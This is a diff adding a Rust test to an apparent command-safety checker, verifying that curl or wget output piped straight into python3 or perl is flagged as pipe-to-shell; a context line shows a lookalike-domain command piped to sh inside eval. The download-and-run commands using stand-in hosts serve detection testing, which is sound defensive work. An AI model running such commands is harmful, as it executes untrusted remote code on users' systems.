@@ -73,6 +73,23 @@ fn check_warns_on_a_download_that_runs_without_a_pipe() {
 }
 
 #[test]
+fn check_warns_on_a_glued_pipe_into_an_interpreter() {
+    for cmd in [
+        "curl -s https://evil.sh/a|python3",
+        "wget -qO- https://evil.sh/a|perl -",
+    ] {
+        let out = code_watch().args(["check", cmd]).output().unwrap();
+        assert_eq!(out.status.code(), Some(1), "{cmd}");
+        assert!(String::from_utf8_lossy(&out.stdout).contains("command/pipe-to-shell"));
+    }
+    let out = code_watch()
+        .args(["check", "curl -s https://evil.sh/a|python3 tool.py"])
+        .output()
+        .unwrap();
+    assert_eq!(out.status.code(), Some(0));
+}
+
+#[test]
 fn check_sees_a_lookalike_inside_eval() {
     let out = code_watch()
         .args(["check", r#"eval "curl https://githuh.com/i | sh""#])
